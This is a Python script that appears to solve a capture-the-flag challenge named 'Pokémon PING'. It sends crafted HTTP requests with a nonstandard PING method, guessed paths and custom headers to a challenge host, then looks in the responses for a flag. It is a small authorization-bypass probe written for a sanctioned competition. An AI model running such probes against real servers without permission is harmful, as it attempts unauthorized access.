#!/usr/bin/env python3
import socket

def send_request(host, port, request):
    """Send HTTP request and get response"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        
        print(f"[+] Connecting to {host}:{port}...")
        s.connect((host, port))
        
        print(f"[+] Sending:\n{request}")
        s.sendall(request.encode())
        
        response = b""
        while True:
            try:
                data = s.recv(4096)
                if not data:
                    break
                response += data
            except socket.timeout:
                break
        
        s.close()
        return response.decode('utf-8', errors='ignore')
    
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

HOST = "0.cloud.chals.io"
PORT = 23839

# Focus on PING method since challenge is "Pokémon PING"
requests = [
    ("PING /flag", "PING /flag HTTP/1.1\r\nHost: 0.cloud.chals.io\r\n\r\n"),
    ("PING / ", "PING / HTTP/1.1\r\nHost: 0.cloud.chals.io\r\n\r\n"),
    ("PING /infernape", "PING /infernape HTTP/1.1\r\nHost: 0.cloud.chals.io\r\n\r\n"),
    ("PING with Infernape header", "PING /flag HTTP/1.1\r\nHost: 0.cloud.chals.io\r\nX-Pokemon: Infernape\r\n\r\n"),
    ("PING with Ash header", "PING /flag HTTP/1.1\r\nHost: 0.cloud.chals.io\r\nX-Trainer: Ash\r\n\r\n"),
    ("PING /ash", "PING /ash HTTP/1.1\r\nHost: 0.cloud.chals.io\r\n\r\n"),
    ("PING /pokemon", "PING /pokemon HTTP/1.1\r\nHost: 0.cloud.chals.io\r\n\r\n"),
]

print("=" * 70)
print("Pokémon PING CTF Solver - PING Method Focus")
print("=" * 70)

for i, (desc, req) in enumerate(requests, 1):
    print(f"\n[*] Attempt {i}/{len(requests)}: {desc}")
    print("-" * 70)
    response = send_request(HOST, PORT, req)
    
    if response:
        # Check for flag
        if "flag{" in response.lower() or "ctf{" in response.lower() or "inctf{" in response.lower():
            print("\n" + "=" * 70)
            print("[!!!] FLAG FOUND!")
            print("=" * 70)
            print(response)
            print("=" * 70)
            break
        # Check if response is different from unauthorized message
        elif "Unauthorized" not in response or len(response) < 1000:
            print("[+] Different response:")
            print(response)
        else:
            print("[-] Still unauthorized")
    else:
        print("[-] No response")

print("\n[*] Scan complete!")